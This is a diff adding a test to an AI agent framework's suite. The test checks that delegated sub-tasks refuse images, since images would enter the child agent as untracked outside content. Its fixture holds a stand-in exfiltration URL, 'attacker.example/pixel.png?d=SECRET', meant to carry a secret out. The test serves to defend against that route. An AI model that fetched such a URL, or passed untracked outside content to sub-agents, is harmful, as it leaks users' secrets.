@@ -130,6 +130,22 @@ def test_background_children_are_refused(dagent, dworker, stub):
     assert any("cannot run in the background" in t for t in tool_texts(stub, "tag-cdg4"))
 
 
+def test_sub_tasks_are_never_given_images(dagent, dworker, stub, tmp_path):
+    """``images`` (a URL or a local file) would reach the child's first message as outside content
+    with no taint source: the call is refused, no child starts and no model request carries an image."""
+    local = tmp_path / "passport.png"
+    local.write_bytes(bytes.fromhex("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"))
+    pics = ["https://attacker.example/pixel.png?d=SECRET", str(local)]
+    kid = dict(child([{"text": "saw it"}], "kid-img"), images=pics)
+    done, seen = run(dworker, dagent, stub, "cdg4i", [{"calls": [["delegate_task", {"tasks": [kid]}]]},
+                                                     {"calls": [["delegate_task", {"goal": "x", "images": pics}]]},
+                                                     {"text": "ok"}])
+    assert done["completed"] is True and not events(seen, "subagent") and done["tainted_sources"] == [], done
+    assert sum("cannot be given images" in t for t in tool_texts(stub, "tag-cdg4i")) == 1
+    bodies = json.dumps([r["body"] for r in stub.requests if r["method"] == "POST"])
+    assert "image_url" not in bodies and "data:image" not in bodies and "Image attached" not in bodies
+
+
 def test_shared_pool_blocks_the_61st_child_call(dagent, dworker, stub):
     """Every child of the run shares 60 tool calls; the 61st is blocked with the budget message."""
     def todo(i: int) -> list:
